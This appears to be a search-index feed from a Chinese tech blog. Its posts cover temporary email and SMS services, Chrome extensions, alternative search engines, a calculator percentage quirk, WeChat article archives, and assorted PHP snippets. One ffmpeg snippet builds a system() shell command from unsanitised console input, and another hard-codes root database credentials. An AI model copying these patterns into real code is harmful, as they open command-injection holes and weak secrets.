    <url>%2F2019%2F09%2F16%2F%E6%80%95%E8%A2%AB%E5%8F%91%E5%9E%83%E5%9C%BE%E9%82%AE%E4%BB%B6%EF%BC%9F%E7%94%A8%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1%E6%9D%A5%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[注册网站一般都需要邮箱，但有时候不想用自己的邮箱来注册，有些网站总给你发垃圾广告，这时可以用临时邮箱来注册。 临时邮箱也被称为一次性邮箱和匿名邮箱，就是提供一个简易的临时邮箱服务，不需要注册，打开网页即可使用，但临时邮箱时效性很短，通常只有10分钟，一小时或者一天，所以不能作为一个长期固定的邮箱来使用。 十分钟邮箱https://bccto.me/ 生成一个自定义邮箱地址 susheng@bccto.me很快收到一封邮件，可以查看到邮件内容 三十分钟邮箱https://shorttimemail.com/zh-Hans 生成一个临时邮箱 k8sf27e_j@shorttimemail.com 一小时邮箱https://www.moakt.com/zh 生成一个自定义邮箱地址susheng@disbox.net 有效期为一个小时，自己发送邮箱测试下效果。 过期前还能延时 24小时邮箱http://24mail.chacuo.net/ 这个网站会临时给你生成个邮箱地址，你也可以自定义，比如这个 zjupef35610@chacuo.net ，24小时后失效，网站给这个邮箱发的邮件直接可以在下面显示出来。 如果网站还需要手机号注册，也怕被发垃圾短信，同样有临时手机号来接受短信，比如https://www.pdflibr.com/SMSContent/1 其他https://temp-mail.org/zh/https://9em.org/短信http://www.z-sms.com/高效搜罗导航http://www.gaoxiaosouluo.cn/ 代接受验证码的网站，http://www.smszk.com/ 如果不想用自己的手机接受验证码的话，可以用这个可以暂时解决短信收发的问题代收短信 www.pdflibr.com/https://sms.bilulanlv.com/message/3322077483.html在线收到短信 https://www.becmd.com/ https://www.cnwml.com/免费ssr https://www.attackmen.com/ 推荐阅读: 如何发一条空白的朋友圈 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些我常用的 Chrome 扩展]]></title>
    <url>%2F2019%2F09%2F16%2F%E9%82%A3%E4%BA%9B%E6%88%91%E5%B8%B8%E7%94%A8%E7%9A%84-Chrome-%E6%89%A9%E5%B1%95%2F</url>
    <content type="text"><![CDATA[Chrome仍然是目前最好的浏览器，每天用Chrome 必然少不了使用扩展来增强浏览器的功能，这里整理下我常用的Chrome 扩展。 油猴这个简直神器，所以第一个推荐 https://www.tampermonkey.net/ 下载后在https://greasyfork.org/zh-CN 这里安装对应的脚本。 常用的脚本比如百度网盘直链下载全网VIP视频免费观看 之前已经写过 Chrome 浏览器扩展神器油猴Chrome 浏览器扩展神器暴力猴下载地址 https://chrome.google.com/webstore/detail/dhdgffkkebhmkfjojejmpbldmpobfkfo 取字之前写过ocr 那些你可能不知道的 ocr 图片文字识别工具，虽然有桌面版工具天若ocr，但在浏览器里还是用取字这个扩展方便http://willingstudio.com/#install ，它具有通识化场景的 OCR 识别功能浏览器插件，快速框选，可精确识别图片或者视频中的文本。 它提供本地安装和Chrome应用商店安装https://chrome.google.com/webstore/detail/jmonhcfndjifnfldnaknlpgpfjlgpiig?from=http://willingstudio.com 安装方法上面也有，上不了Google推荐下面的方法。 使用效果如图： WEB前端助手这个扩展包含多个独立小应用，比如：Json工具、代码美化、代码压缩、二维码、Postman、markdown、网页油猴、便签笔记、信息加密与解密、随机密码生成、Crontab等等！扩展地址 https://chrome.google.com/webstore/detail/web%E5%89%8D%E7%AB%AF%E5%8A%A9%E6%89%8Bfehelper/pkgccpejnmalmdinmhkkfafefagiiiad?hl=zh-CN listen1Listen 1可以搜索和播放来自网易云音乐，虾米，QQ音乐，酷狗音乐，酷我音乐网站的歌曲，让你的曲库更全面，不用一个个找了。https://listen1.github.io/listen1/ 之前也写过 那些你可能不知道的网易云音乐奇技淫巧 极简 Json 格式化这个用来看json格式的接口最方便了，由https://atool.vip/#/提供。 下载地址 https://chrome.google.com/webstore/detail/%E6%9E%81%E7%AE%80-json-%E6%A0%BC%E5%BC%8F%E5%8C%96/fhlnfdmpnhhakjljpllkigcegcejpoec?hl=zh-CN 百度网盘助手用来下载百度网盘的工具 增加高速下载按钮。 下载地址 https://github.com/high-speed-downloader/high-speed-downloader 图片助手一款Chrome浏览器中用于嗅探、分析网页图片、图片筛选、下载等功能及收藏、检索、分享等在线服务的扩展程序，无论图片是使用flash载入还是动态载入的，扩展都能很好地应对，真正做到所见即所得 http://www.pullywood.com/ImageAssistant/ 下载地址https://chrome.google.com/webstore/detail/imageassistant-batch-imag/dbjbempljhcmhlfpfacalomonjpalpko 微博图床一个上传图片到微博并生成外链的 Chrome 浏览器扩展https://github.com/Semibold/Weibo-Picture-Store，支持同步到微相册 ，需要浏览器登录微博。 下载地址 https://chrome.google.com/webstore/detail/pinjkilghdfhnkibhcangnpmcpdpmehk 谷歌访问助手这个上谷歌必备 下载地址https://github.com/haotian-wang/google-access-helper/archive/master.zip 如果下载不了公众号回复 谷歌 获取 爱搜资源云盘助手之前写过文章 没有提取码怎么获取百度网盘资源？，不用自己输入提取码。https://www.aisouziyuan.com/ 下载地址 https://chrome.google.com/webstore/detail/%E7%88%B1%E6%90%9C%E8%B5%84%E6%BA%90%E4%BA%91%E7%9B%98%E5%8A%A9%E6%89%8B-%E7%A8%B3%E5%AE%9A%E7%89%88/mbklgpngoohbbagagdfoccaclpdhgihd?hl=zh-CN 壹伴经常使用公众号推荐这个工具，数据统计，点赞率和留言率都显示出来。https://yiban.io/ 下载地址 https://chrome.google.com/webstore/detail/%E5%A3%B9%E4%BC%B4-%C2%B7-%E5%B0%8F%E6%8F%92%E4%BB%B6/ibefaeehajgcpooopoegkifhgecigeeg 一键视频下载器比如微博上的视频，点击按钮就能显示当前可以下载的视频，直接点击下载到本地。下载地址 https://chrome.google.com/webstore/detail/one-click-video-downloade/bhepgcoaibmmehlmckhlmbdgcemhidcg 翻译co-trans-ext 是一个集搜狗翻译、百度翻译、谷歌翻译、有道翻译、金山词霸于一体的翻译扩展。各平台可随时切换，取长补短，更适合于阅读各领域的文档。不止于翻译，解析详细，更利于对各门语言的深入学习与理解。支持划词翻译和网页翻译。下载后将crx后缀改为zip，然后拖到扩展中，除了翻译还提供发音，非常好用。 下载地址：https://github.com/Coande/co-trans-ext 截图它满足截图所有的需求，截取可见网页，选择区域，整个网页，录屏，捕获整个页面或任何部分，矩形，圆形，箭头，线条和文字，模糊敏感信息，一键上传分享注释。 下载地址https://chrome.google.com/webstore/detail/awesome-screenshot-screen/nlipoenfbbikpbjkfpfillcgkoblgpmj 聊天和浏览相同网页的人实时聊天，发弹幕！http://yiyechat.com/该扩展可以在任意网页增加一个简洁的聊天盒，让您可以和浏览当前网站的其他用户聊天！ 这是百度页面的聊天 下载地址 https://chrome.google.com/webstore/detail/same-page/bldcellajihanglphncgjmceklbibjkk 其他用Chrome学编程(如何用Chrome优雅装B) https://github.com/zhaoolee/ProgrammingWithChromeChrome插件英雄榜 https://zhaoolee.gitbooks.io/chrome/content/那些离不开的 Chrome 扩展插件https://michael728.github.io/2015/11/26/tools-chrome-extentions/ 你平常用了哪些不错的扩展，也欢迎评论给我推荐下。 推荐阅读: 那些你可能不知道的浏览器奇技淫巧 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的小众搜索引擎]]></title>
    <url>%2F2019%2F09%2F16%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E5%B0%8F%E4%BC%97%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[国内大多数人在使用百度，但有些搜索结果广告多，而且有时候搜不到满意的结果，谷歌又访问不了，不过你可以试试下面这些小众的搜索引擎。 dogedoge一个不追踪隐私的搜索引擎https://www.dogedoge.com/ 页面干净无广告。 mijisou秘迹搜索也是一个 不追踪你的搜索引擎 https://mijisou.com/ goobe一个好用的程序员搜索https://goobe.io/ 对比下百度搜索结果 mezwhttps://so.mezw.com/ MEZW搜索是一家聚合搜索引擎网站，致力于为用户提供准确、干净的网页内容搜索服务，搜索结果来自海内外不同内容渠道的聚合。 Lookaohttps://lookao.com/ Lookao 是一款轻量简洁的搜索引擎，它不会收集你的隐私、追踪你的上网行为。也不会根据你的历史记录来干预搜索排名，搜索结果千人一面，内容更加纯粹。 中国搜http://www.chinaso.com ，第一条不是广告。 聚合搜索https://gobaidugle.com/ 可以自由切换不同的搜索引擎，比如百度谷歌搜狗淘宝京东等。 虽然上面的是不同的搜索引擎，但搜索技巧是相通的，推荐看之前整理的文章 那些你可能不知道的搜索奇技淫巧 还有萌搜 https://mengso.com 目前不可访问。 推荐阅读: 有意思的举牌告白小人 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10%+10% 不等于 0.2？]]></title>
    <url>%2F2019%2F09%2F16%2F10-10-%E4%B8%8D%E7%AD%89%E4%BA%8E-0-2%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[看到这个标题，你可能会觉得震惊，怎么会不是0.2呢? 最近在知乎上看到这个有意思的问题https://www.zhihu.com/question/343963978，为什么手机上的计算器计算 10%+10% 都错了，结果不是0.2，而是0.11。 第一感觉是不可思议，赶紧拿出我的华为手机（EMUI版本为9.1）测试了下，果然是0.11！ 看看谷歌的计算器，0.2没错。 但是搜索计算器 再计算的结果却是0.11，很奇怪。 然后在在线自动问答系统搜索引擎wolframalpha上看看https://www.wolframalpha.com/input/?i=10%25%2B10%25 它给出了3种结果，有0.2和0.11 。 ps：wolframalpha这个网站计算数学很不错，比如黄金分割比0.618 再看看国家统计局的解释http://www.stats.gov.cn/tjzs/tjcd/200205/t20020523_25320.htmlhttps://cn.v2ex.com/t/597205?p=1 搜索了下苹果和小米等手机都是如此。 然而魅族手机却是个例外。 魅族副总裁在微博上的解释是这样的 https://weibo.com/1444241363/I554TgDEs? 本质上并不是对或错的问题，我们只是考虑的更多，增加了人性化的算法判断。10%+10%=0.11 这个是国外的使用逻辑，而国内的算数逻辑是 10%+10%=0.2，所以我们针对不同地区的固件做了不同的算法判断。 算小费等特殊场景，很多国家餐厅吃饭给10-20%的小费，这时100+10%相当于100+100*10%，相当方便的一种人性化设计。 所以10%+10%是按照10%+（10% x 10%）这个逻辑得出0.11的结果，10+10%就是11。 只能说国内和国外使用习惯不同，中国人没有付小费的习惯，而且我们一般是用0.1+0.1算的，这应该算计算器的feature，不算bug。 看看你的手机计算器结果是0.2还是0.11？ 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[想看的公众号文章被删了怎么办]]></title>
    <url>%2F2019%2F09%2F16%2F%E6%83%B3%E7%9C%8B%E7%9A%84%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E8%A2%AB%E5%88%A0%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%2F</url>
    <content type="text"><![CDATA[每个人都或多或少关注不少公众号，并且每人关注的公众号上限是1000，为什么我知道呢，因为我就关注到1000了，超过1000后再关注会提示这个。 关注这么多，我都会看吗？当然不会，哪有这么多时间，首先会看置顶的那些有意思的号，其他的主要来自朋友圈和在看里的文章，一般都是在微信里看文章，但如果上班时间摸鱼要看看公众号，拿手机肯定不方便（被发现更不方便），除了在微信里看公众号文章，其实还有很多网站抓取了公众号的文章，这样就可以直接在pc上看了。 而且很多文章因为某些原因就被删了，比如这样： 有了这些第三方网站，这样的文章你还能看到。 下面推荐几个我常用的pc查看公众号文章网站/工具，以腾讯家的号 微信派 为例。 微信pc客户端这个不用说了，微信官方的。 搜狗微信因为微信屏蔽了搜索引擎，https://mp.weixin.qq.com/robots.txt 这里可以看到12345678User-Agent: *Allow: /$Allow: /debug/Allow: /qa/Allow: /wikiAllow: /cgi-bin/loginpageAllow: /cgi-bin/wxDisallow: / 所以在谷歌百度上搜不到公众号的文章，但搜狗微信 https://weixin.sogou.com/ 是微信官方合作伙伴，所以这里有公众号文章的入口。之前每个号的主页可以看最近10条推送文章，但不知道为什么关闭了。 没关系，曲线救国，搜索里选择账号内搜索，时间选择最近一个月的，一样可以看到最近推送文章。 今天看啥网址 http://www.jintiankansha.me 这个网站提供的公众号文章已经很多了，如果没有你想看的公众号可以自己来提交http://www.jintiankansha.me/about搜索 微信派 可以进入它的主页可以看到推送的文章http://www.jintiankansha.me/column/gREO9Ub5z6 这个网站是全文抓取的，比如这篇文章http://www.jintiankansha.me/t/lVkBWVkHq4 公众号原文是娱乐圈“三大程序员”现身，只为他们 如果微信派删除了这篇文章，在公众号是没法看了，你还可以来这里看。 瓦斯阅读网址 https://qnmlgb.tech/搜索 微信派 可以找到主页https://qnmlgb.tech/authors/5b644276244d4e5035e0b409 这个网站查看文章还需要登录，不过注册也简单，但是它只是提供个入口，看文章还是跳转到微信的链接，所以如果被删了，就看不到了。 二十次幂网址https://www.ershicimi.com ，这也是一个微信公众号内容聚合网站。 搜索 微信派 进入主页https://www.ershicimi.com/a/121 这个网站还提供数据分析，可以看到每篇文章阅读量和在看数。还能监控文章阅读数，如果阅读量增长（暴增）不正常可能是刷阅读了，详细内容看作者博客介绍https://foofish.net/ershicimi_monitor.html 有个不足的地方，它也是提供微信的链接，如果文章被删了，也就看不到了。 传送门网址https://chuansongme.com/ 这个网站存在好多年了，上面的文章也不少。搜索 微信派 进入主页https://chuansongme.com/account/wx-pai 它也是全文抓取的，不过数据有延时，娱乐圈“三大程序员”现身，只为他们 这篇文章就还没收录。 好了，现在可以更安心的上班摸鱼了。 其他新榜 https://data.newrank.cn/m/s.html?s=PigyPDI2KStLhttps://wemp.app/posts/ecce54d7-84c2-44d8-a72e-8792c8060a2ahttps://www.ershicimi.com/a/6655https://mlog.club/user/616瓦斯阅读https://zhuanlan.zhihu.com/p/76684529一个极简的微信公众号历史文章查阅网站. http://bsbx.vip/index.html?cid=3http://www.heijing.co/tag/mimeng7/page/9http://wenzhangyuan.com/qinggan/mimenghttps://wemp.app/accounts/2577572b-07b7-44e7-b088-bada02266ef6http://www.python88.com/我们还可以在「微信读书」中，以文集的方式订阅和阅读微信公众号里的文章。 https://weread.qq.com/ https://www.jianshu.com/p/5b151224c84c 推荐阅读: 如何发一条空白的朋友圈 有意思的举牌告白小人 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些你可能用得上的简历写作工具 Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 代码整理(续)]]></title>
    <url>%2F2019%2F09%2F09%2Fphp-%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86-%E7%BB%AD%2F</url>
    <content type="text"><![CDATA[Excel 导入导出工具12345678910111213composer require phpoffice/phpspreadsheetrequire 'vendor/autoload.php';use PhpOffice\PhpSpreadsheet\Spreadsheet;use PhpOffice\PhpSpreadsheet\Writer\Xlsx;$spreadsheet = new Spreadsheet();$sheet = $spreadsheet-&gt;getActiveSheet();$sheet-&gt;setCellValue('A1', 'Hello World !');$writer = new Xlsx($spreadsheet);$writer-&gt;save('hello world.xlsx');https://learnku.com/laravel/t/33677 FFmpeg 截取视频中多个图片,然后拼成一张图12345678910111213141516171819202122 //获取文件路径 fwrite(STDOUT, "哪个视频文件:"); $video_path = trim(fgets(STDIN)); fwrite(STDOUT, "多少秒截取1张图:"); $s = trim(fgets(STDIN)); //设置输出路径 fwrite(STDOUT, "输出到哪里:"); $export_path = trim(fgets(STDIN)); $command = system('ffmpeg -y -i '.$video_path.' -vf "fps=1/'.$s.',scale=iw/4:-1,tile=2x2" -an '.$export_path.'_%d.png'); https://learnku.com/laravel/t/33066 // fps = 1/2 每2秒截一张图,如果是每秒截一张 参数就是 fps=1 // scale 截图大小,上面的代码是设置宽为原始的1/4大小,高度自动,也可以设置成固定值如:120:80 // tile 网格化,自动将100张图合并成一张大图 截图会输出很多张大图，这不是我想要的，我只想从视频中提取 4 张图片，然后拼接成一张大图怎么操作； 获得视频总时长然后除以 4 就好了 (如果要 6 张图就除以 6) 代码如下: $duration = system('ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 -i '.$video_path.''); $s = $duration/4; $command = system('ffmpeg -y -i '.$videopath.' -vf "fps=1/'.$s.',scale=iw/4:-1,tile=2x2" -an 1%d.png'); MySQL 事务最全详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112// 我们先查看表中的数据,id为1的age字段是12mysql root@127.0.0.1:test&gt; select * from user;+----+------+-----+| id | name | age |+----+------+-----+| 1 | 张三 | 12 || 2 | 李四 | 15 |+----+------+-----+2 rows in setTime: 0.013s// 开启事务mysql root@127.0.0.1:test&gt; begin;Query OK, 0 rows affectedTime: 0.001s// 将id为1的age字段改为10mysql root@127.0.0.1:test&gt; update user set age=10 where id=1;Query OK, 1 row affectedTime: 0.001s// 再次查询数据时,发现数据改为修改后的值mysql root@127.0.0.1:test&gt; select * from user;+----+------+-----+| id | name | age |+----+------+-----+| 1 | 张三 | 10 || 2 | 李四 | 15 |+----+------+-----+2 rows in setTime: 0.012s// 此时我们进行回滚操作mysql root@127.0.0.1:test&gt; rollback;Query OK, 0 rows affectedTime: 0.001s// 再次查询发现数据回到最初状态mysql root@127.0.0.1:test&gt; select * from user;+----+------+-----+| id | name | age |+----+------+-----+| 1 | 张三 | 12 || 2 | 李四 | 15 |+----+------+-----+2 rows in setTime: 0.019s// 我们再次对数据进行修改mysql root@127.0.0.1:test&gt; update user set age=15 where id=1;Query OK, 1 row affectedTime: 0.001s// 此时将事务进行提交mysql root@127.0.0.1:test&gt; commit;Query OK, 0 rows affectedTime: 0.000s// 发现此时的数据变为我们最终提交的值mysql root@127.0.0.1:test&gt; select * from user;+----+------+-----+| id | name | age |+----+------+-----+| 1 | 张三 | 15 || 2 | 李四 | 15 |+----+------+-----+2 rows in setTime: 0.012s// 我们尝试用刚才回滚的方式进行还原数据mysql root@127.0.0.1:test&gt; rollback;Query OK, 0 rows affectedTime: 0.000s// 发现数据无法回退了,仍然是提交后的数据mysql root@127.0.0.1:test&gt; select * from user;+----+------+-----+| id | name | age |+----+------+-----+| 1 | 张三 | 15 || 2 | 李四 | 15 |+----+------+-----+2 rows in setTime: 0.017sPHP 实现事务实例代码&lt;?php// 连接MySQL$mysqli = new mysqli('127.0.0.1', 'root', '123456', 'test', 3306);// 关闭事务自动提交$mysqli-&gt;autocommit(false);// 1.开启事务$mysqli-&gt;begin_transaction();// 2.修改数据$mysqli-&gt;query("update user set age=10 where id=1");// 3.查看数据$mysqli-&gt;query("select * from user");// 4.事务回滚$mysqli-&gt;rollback();// 5.查看数据$mysqli-&gt;query("select * from user");// 7.修改数据$mysqli-&gt;query("update user set age=15 where id=1");// 8.事务提交$mysqli-&gt;commit();// 9.事务回滚$mysqli-&gt;rollback();// 10.查看数据$mysqli-&gt;query("select * from user");如何设置事务的隔离级别// 查看当前的事务隔离级别mysql root@127.0.0.1:test&gt; select @@tx_isolation;+-----------------+| @@tx_isolation |+-----------------+| REPEATABLE-READ |+-----------------+1 row in setTime: 0.015s// 设置隔离级别set session transaction isolation level 隔离级别(上面事务隔离级别中的英文单词);https://learnku.com/articles/33749 二进制转图片12345678910111213141516171819202122232425262728293031323334&lt;?php/** * Created by 独自等待 * Date: 2014/11/12 * Time: 10:10 * Name: decode.php * 独自等待博客：https://www.waitalone.cn/11-game.html */ $bin = &lt;&lt;&lt;binary01001000 00110100 01110011 01001001 01000001 01000011 01001010 01001011 #第1行#为阅读方便，把第1行和最后1行之间的省略了，大家测试的时候请把二进制代码放到这里01001010 01000001 01000001 01101111 01000001 01000001 01000001 00111101 #最后1行binary;$bin_arr = explode(' ',str_replace("\r\n"," ",$bin));#print_r($bin_arr);$dec = '';foreach ($bin_arr as $bin_code) &#123; $dec .= chr(bindec($bin_code));&#125;echo $dec;fwrite(fopen('key.tar.gz','wb'),base64_decode($dec));chr(bindec('01110011'))//simport base64bin = '''01001000 00110100 01110011 01001001 01000001 01000011 01001010 01001011 #第1行#为阅读方便，把第1行和最后1行之间的省略了，大家测试的时候请把二进制代码放到这里01001010 01000001 01000001 01101111 01000001 01000001 01000001 00111101 #最后1行'''binTochar = [chr(int(x, 2)) for x in bin.strip().split()]print ''.join(binTochar)keyFile = open('key.tar.gz', 'wb')keyFile.write(base64.b64decode(''.join(binTochar)))keyFile.close() windos 安装 Laravel/horizon1composer.json 中增加以下两个字段："platform": &#123; "ext-pcntl": "7.2", "ext-posix": "7.2"&#125;，增加至 config 字段中，再次运行安装命令即可～ 回调函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$array = [1, 2, 3, 4];$str = array_reduce($array, function ($return_str, $value) &#123; $return_str = $return_str . $value; //层层迭代 return $return_str;&#125;);// 一个基本的购物车，包括一些已经添加的商品和每种商品的数量。// 其中有一个方法用来计算购物车中所有商品的总价格，该方法使// 用了一个 closure 作为回调函数。class Cart&#123; const PRICE_BUTTER = 1.00; const PRICE_MILK = 3.00; const PRICE_EGGS = 6.95; protected $products = array(); public function add($product, $quantity) &#123; $this-&gt;products[$product] = $quantity; &#125; public function getQuantity($product) &#123; return isset($this-&gt;products[$product]) ? $this-&gt;products[$product] : FALSE; &#125; public function getTotal($tax) &#123; $total = 0.00; $callback = function ($quantity, $product) use ($tax, &amp;$total) &#123; //定义一个回调函数 取出 当前商品的价格 $pricePerItem = constant(__CLASS__ . "::PRICE_" . strtoupper($product)); $total += ($pricePerItem * $quantity) * ($tax + 1.0); &#125;; array_walk($this-&gt;products, $callback); return round($total, 2);; &#125;&#125;$my_cart = new Cart;// 往购物车里添加条目$my_cart-&gt;add('butter', 1);$my_cart-&gt;add('milk', 3);$my_cart-&gt;add('eggs', 6);// 打出出总价格，其中有 5% 的销售税.print $my_cart-&gt;getTotal(0.05) . "\n";// 最后结果是 54.29https://learnku.com/articles/33848 并发问题123456789101112131415161718 //正常写法,获取最后一条数据，新的单据编号+1，有并发问题 $last = Article::orderByDesc('id')-&gt;first(); $data = [ 'code' =&gt; $last-&gt;code + 1, ]; $article = Article::create($data); //---------------------------------------------------------------------------------// //解决并发问题 测试ab -t 6 -c 20 http://study.local/xxx DB::beginTransaction(); $last = Article::lockForUpdate()-&gt;orderByDesc('id')-&gt;first(); $data = [ 'code' =&gt; $last-&gt;code + 1, ]; $article = Article::create($data); DB::commit(); https://learnku.com/articles/33809高性能分布式并发锁, 行为限流https://github.com/zhaocong6/lock intervention/image慢12345678910111213141516171819202122232425262728293031// 记录开始时间$startTimestamp = microtime(true);$url = 'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0';$avatar = \Image::make($url);// 记录结束时间$endTimestamp = microtime(true);info($startTimestamp);info($endTimestamp);info($endTimestamp - $startTimestamp);$startTimestamp = microtime(true);$client = new \GuzzleHttp\Client();$url = 'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0';$avatarResponse = $client-&gt;get($url);$avatar = \Image::make($avatarResponse-&gt;getBody()-&gt;getContents());$endTimestamp = microtime(true);info($startTimestamp);info($endTimestamp);info($endTimestamp - $startTimestamp); https://tianyong90.com/posts/intervention-image-zhong-de-yi-ge-xiao-keng-ji-qi-po-jie-zhi-fa/在这里我先使用 GuzzleHttp 获取头像，再使用 Image::make($data) 创建头像 laravel5.5 中读写分离1明明刚刚写入了数据，但查询时却报 No query result ，而且只是偶然性出现，没啥规律。 在没有启用 sticky 的时候，使用 write 连接写入数据后立即读取，读取时使用的是 read 连接，这样就有可能出问题。将 sticky 设置为 true 后，在与这个写入操作相同的请求周期内的后续读取操作，仍然使用原来的 write 连接，就不会有这麻烦了。 puppeteer 采集异步加载1234567891011121314151617181920212223242526272829303132composer require spatie/browsershotnpm i puppeteer --saveuse Spatie\Browsershot\Browsershot;public function getBodyHtml()&#123; $newsUrl = 'https://m.toutiao.com/i6546884151050502660/'; $html = Browsershot::url($newsUrl) -&gt;windowSize(480, 800) -&gt;userAgent('Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36') -&gt;mobile() -&gt;touch() -&gt;bodyHtml(); \Log::info($html);&#125;use Spatie\Browsershot\Browsershot;public function getBodyHtml()&#123; $newsUrl = 'https://m.toutiao.com/i6546884151050502660/'; Browsershot::url($newsUrl) -&gt;windowSize(480, 800) -&gt;userAgent('Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36') -&gt;mobile() -&gt;touch() -&gt;setDelay(1000) -&gt;save(public_path('images/toutiao.jpg'));&#125;https://tianyong90.com/posts/laravel-zhong-shi-yong-puppeteer-cai-ji-yi-bu-jia-zai-de-wang-ye-nei-rong/ session 与 cookie123456789101112131415161718 cookie运行原理1. 客户端向服务端发起一个 http 请求.2. 服务端设置一个创建 cookie 的指令，响应给客户端.3. 客户端收到服务端响应的指令，根据指令在客户端创建一个 cookie.4. 挡下一次请求时，客户端携带这个 cookie 向服务端发送请求.session. 运行原理 1. 客户端向服务端发起请求，建立通信 2. 服务端根据设置的 session 创建指令，在服务端创建一个编号为 sessionid 的文件，里面的值就是 session 具体的值 (组成部分 变量名 | 类型 : 长度：值). 3. 服务端将创建好的 sessionid 编号响应给客户端，客户则将该编号存在 cookie 中 (一般我们在浏览器存储的调试栏中会发现 cookie 中有一个 PHPSESSID 的键，这就是 sessionid，当然这个名称，我可以通过设置服务端是可以改变的). . 当下一次请求时，客户端将这个 sessionid 携带在请求中，发送给服务端，服务端根据这个 sessionid 来做一些业务判断 PHP-Casbin 的 ABAC 权限控制12345678910111213141516171819202122232425262728293031https://github.com/php-casbin/php-casbinABAC 的官方实例如下:[request_definition]r = sub, obj, act[policy_definition]p = sub, obj, act[policy_effect]e = some(where (p.eft == allow))[matchers]m = r.sub == r.obj.owner这是 r.obj 类的定义:$data1 = new \stdClass();$data1-&gt;name = 'data1';$data1-&gt;owner = 'alice';$data2 = new \stdClass();$data2-&gt;name = 'data2';$data2-&gt;owner = 'bob';然后使用决策器进行决策:$e-&gt;enforce('alice', $data1, 'read'); // true$e-&gt;enforce('alice', $data2, 'read'); // false$e-&gt;enforce('bob', $data1, 'read'); // false$e-&gt;enforce('bob', $data2, 'read'); // truehttps://learnku.com/articles/33921 php artisan tinker edit1234567php artisan tinker&gt;&gt;&gt;edit进入了 Vim 文本状态，能够正常的编写你想要的代码 编辑完之后，我们保存并退出这个文件，tinker 会自动执行我们刚才写好的代码，并将结果进行输出。也可以考虑使用 spatie/laravel-web-tinker 还有一种方法是 直接把代码写到 php 文件里，然后 php artisan tinker your-file.php 也是我常用的一种解决方法。 psysh 更多使用可以查看文档 https://psysh.org/ https://learnku.com/laravel/t/33957 使用 PHP-version 切换 PHP 版本123456789101112131415[qian@bogon ~ ]$ mkdir $HOME/.local[qian@bogon ~ ]$ cd $HOME/.local[qian@bogon .local ]$ git clone https://github.com/wilmoore/php-version.git[qian@bogon .local ]$ source $HOME/.local/php-version/php-version.sh//测试 查看当前php版本[qian@bogon .local ]$ php-version* 7.1.18 7.2.22[qian@bogon ~ ]$ echo "source $HOME/.local/php-version/php-version.sh" &gt;&gt; ~/.zshrc[qian@bogon ~ ]$ source ~/.zshrc切换 php 版本php-version 7.1或php-version 7.2 动态绘制会员卡图片12345678910111213141516171819202122232425262728/** * PHP GD 动态绘制会员卡图片 * https://github.com/kasuganosoras/SomeCodes/blob/master/v2ex_600721.php * 帖子：https://www.v2ex.com/t/600721 * 更新：现在背景图黑色部分不会变成透明了 * 测试：https://cdn.zerodream.net/api/card/ * 使用：Clone 到本地后，将 v2ex_600721.php 和 v2ex_600721 目录复制到你的网站目录下即可 */// 获取图片大小list($width, $height, $type) = getimagesize(__DIR__ . '/v2ex_600721/images/bg.png');// 文字内容设定$text = "钢板卡号：4040 2333 114 514";// 加载资源$font = __DIR__ . '/v2ex_600721/fonts/mono.ttf';$card = imagecreatefrompng(__DIR__ . '/v2ex_600721/images/bg.png');$image = imagecreatetruecolor($width, $height);$bgColor = imagecolorallocatealpha($image, 0, 0, 0, 127);$white = imagecolorallocate($image, 255, 255, 255);// 